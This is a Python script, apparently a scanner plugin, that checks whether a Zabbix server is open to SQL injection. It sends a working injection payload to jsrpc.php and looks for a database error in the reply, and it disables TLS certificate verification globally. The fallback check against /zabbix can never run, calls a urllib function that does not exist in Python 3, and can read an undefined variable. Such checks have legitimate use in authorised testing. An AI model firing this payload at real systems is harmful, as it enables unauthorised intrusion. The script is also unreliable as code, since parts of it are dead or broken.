# -*- coding:utf-8 -*-

import urllib.request, urllib.error, urllib.parse
import re
import ssl

ssl._create_default_https_context = ssl._create_unverified_context

def verify(protocol,ip,port):
    url = protocol+'://'+ip+':'+str(port)
    print('testing if zabbix sql injection vul')
    payload = "/jsrpc.php?sid=0bcd4ade648214dc&type=9&method=screen.get&timestamp=1471403798083&mode=2&screenid=&groupid=&hostid=0&pageFile=history.php&profileIdx=web.item.graph&profileIdx2=999'&updateProfile=true&screenitemid=&period=3600&stime=20160817050632&resourcetype=17&itemids%5B23297%5D=23297&action=showlatest&filter=&filter_task=&mark_color=1"
    try:
        response = urllib.request.urlopen(url + payload, timeout=10).read()
        key_reg = re.compile(b"INSERT\s*INTO\s*profiles")
        if key_reg.findall(response):
            msg = 'There is zabbix sql injection vul on url: ' +url+ ' .'
            number = 'v32'
            return True,url,number,msg
        else:
            msg = 'There is no zabix sql injection vul'
            number = 'v0'
            return False,url,number,msg
    except Exception as e:
        msg = str(e)
        number = 'v0'
        return False,url,number,msg

    newurl = url + '/zabbix'
    try:
        response = urllib.urlopen(newurl + payload, timeout=10).read()
        key_reg = re.compile(b"INSERT\s*INTO\s*profiles")
        if key_reg.findall(response):
            msg = 'There is zabbix sql injection vul on url: ' +newurl+ ' .'
            number = 'v32'
            print(msg)
            return True,newurl,number,msg
        else:
            pass

    except Exception as e:
        msg = str(e)
        number = 'v0'
        vulexists = False

    if len(msg) > 0:
        return vulexists,url,number,msg
    else:
        msg = 'There is no zabix sql injection vul'
        number = 'v0'
        return False,url,number,msg